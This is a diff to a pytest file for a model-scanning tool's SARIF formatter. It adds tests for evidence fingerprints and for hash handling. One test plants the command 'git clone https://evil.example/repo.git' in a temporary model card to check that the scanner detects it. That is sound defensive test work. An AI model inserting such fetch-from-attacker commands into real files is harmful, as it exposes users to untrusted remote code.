@@ -2,11 +2,13 @@
 
 import json
 import time
+from pathlib import Path
 from types import SimpleNamespace
 
 import pytest
 
 import modelaudit.integrations.sarif_formatter as sarif_formatter
+from modelaudit.core import scan_model_directory_or_file
 from modelaudit.models import AssetModel, FileHashesModel, FileMetadataModel, create_initial_audit_result
 from modelaudit.scanners.base import Issue, IssueSeverity
 
@@ -665,6 +667,70 @@ class TestCreateResults:
         assert "partialFingerprints" in results[0]
         assert "primaryLocationLineHash" in results[0]["partialFingerprints"]
 
+    def test_result_uses_evidence_fingerprint_when_present(self) -> None:
+        issue = Issue(
+            message="Duplicate documentation indicators",
+            severity=IssueSeverity.WARNING,
+            location="/models/a/model_card.md",
+            details={"evidence_fingerprint": "text-doc-network:stable"},
+            timestamp=time.time(),
+        )
+
+        results = _create_results([issue])
+        fingerprint = results[0]["partialFingerprints"]["primaryLocationLineHash"]
+
+        assert isinstance(fingerprint, str)
+        assert len(fingerprint) == 16
+        assert fingerprint == _create_results([issue])[0]["partialFingerprints"]["primaryLocationLineHash"]
+        assert results[0]["properties"]["evidence_fingerprint"] == "text-doc-network:stable"
+
+    def test_result_scopes_evidence_fingerprint_by_artifact_location(self) -> None:
+        first_issue = Issue(
+            message="Duplicate documentation indicators",
+            severity=IssueSeverity.WARNING,
+            location="/models/a/model_card.md",
+            details={"evidence_fingerprint": "text-doc-network:stable"},
+            timestamp=time.time(),
+        )
+        second_issue = Issue(
+            message="Duplicate documentation indicators",
+            severity=IssueSeverity.WARNING,
+            location="/models/b/model_card.md",
+            details={"evidence_fingerprint": "text-doc-network:stable"},
+            timestamp=time.time(),
+        )
+
+        first_result, second_result = _create_results([first_issue, second_issue])
+
+        assert (
+            first_result["partialFingerprints"]["primaryLocationLineHash"]
+            != second_result["partialFingerprints"]["primaryLocationLineHash"]
+        )
+
+    def test_result_preserves_model_card_evidence_fingerprint_and_region(self, tmp_path: Path) -> None:
+        text_path = tmp_path / "model_card.md"
+        text_path.write_text("git clone https://evil.example/repo.git\n", encoding="utf-8")
+
+        result = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+        output = format_sarif_output(result, [str(text_path)])
+        sarif_result = json.loads(output)["runs"][0]["results"][0]
+
+        assert sarif_result["message"]["text"] == "Git clone network command detected: https://evil.example/repo.git"
+        assert len(sarif_result["partialFingerprints"]["primaryLocationLineHash"]) == 16
+        assert (
+            sarif_result["partialFingerprints"]["primaryLocationLineHash"]
+            != sarif_result["properties"]["evidence_fingerprint"]
+        )
+        assert sarif_result["properties"]["evidence_fingerprint"].startswith("text-doc-network:")
+        assert sarif_result["properties"]["normalized_evidence"] == {
+            "kind": "url",
+            "value": "https://evil.example/repo.git",
+        }
+        assert sarif_result["locations"][0]["physicalLocation"]["region"] == {
+            "startLine": 1,
+            "startColumn": len("git clone ") + 1,
+        }
+
     def test_result_kind_by_severity(self):
         """Test result kind based on severity."""
         critical = Issue(message="Critical", severity=IssueSeverity.CRITICAL, timestamp=time.time())
@@ -741,6 +807,16 @@ class TestCreateArtifacts:
         assert "hashes" in artifacts[0]
         assert "sha-256" in artifacts[0]["hashes"]
         assert "md5" in artifacts[0]["hashes"]
+
+    def test_artifact_omits_partial_sha256_prefix_hash(self) -> None:
+        """Partial prefix hashes must not be emitted as complete SARIF hashes."""
+        result = create_initial_audit_result()
+        result.assets = [AssetModel(path="/test/model.pt", type="pickle")]
+        result.file_metadata["/test/model.pt"] = FileMetadataModel(file_hashes=FileHashesModel(sha256_prefix="c" * 64))
+
+        artifacts = _create_artifacts(result)
+
+        assert "hashes" not in artifacts[0]
 
 
 class TestHelperFunctions:
